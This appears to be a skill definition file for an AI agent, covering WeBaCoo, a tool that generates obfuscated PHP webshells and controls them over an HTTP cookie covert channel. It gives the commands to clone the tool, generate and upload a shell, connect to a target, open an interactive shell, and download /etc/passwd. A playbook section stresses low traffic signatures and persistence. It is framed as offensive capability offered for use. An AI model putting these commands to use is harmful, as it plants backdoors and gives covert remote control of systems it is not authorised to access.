---
name: webacoo-encoded-shell
description: "WeBaCoo: HTTP covert channel remote control. Signals: persistence, backdoor, connect webshell, interactive shell mode, download."
zh-signals: "WeBaCoo: HTTP 隐蔽信道远控。信号:持久化,后门,连接 WebShell,交互 shell 模式,下载。"
when-to-use: >-
  Use when you have a WeBaCoo-generated webshell and need an HTTP covert
  channel for interactive shell access and file download.
---

# WeBaCoo

- Attack Category: C15 C2 and Remote Control
- Upstream Repository: https://github.com/anestisb/WeBaCoo
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/anestisb/WeBaCoo
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python webacoo -g -o shell.php` | Generate an obfuscated PHP WebShell |
| `python webacoo -t -u https://t.com/shell.php` | Connect to the WebShell |
| `:shell` | Interactive shell mode |
| `:download /etc/passwd` | Download |
| `:upload local.txt /tmp/` | Upload |

## Attack Scenario Playbook

### HTTP Covert Channel Remote Control

```bash
python webacoo -g -o s.php && upload it
python webacoo -t -u https://t.com/images/s.php
# Requests mimic normal page visits, commands travel in the Cookie, and the traffic signature stays low
```

## Notes

An obfuscated PHP WebShell whose communication is hidden in HTTP cookies, hard to audit at the network layer; a long-standing covert C2.
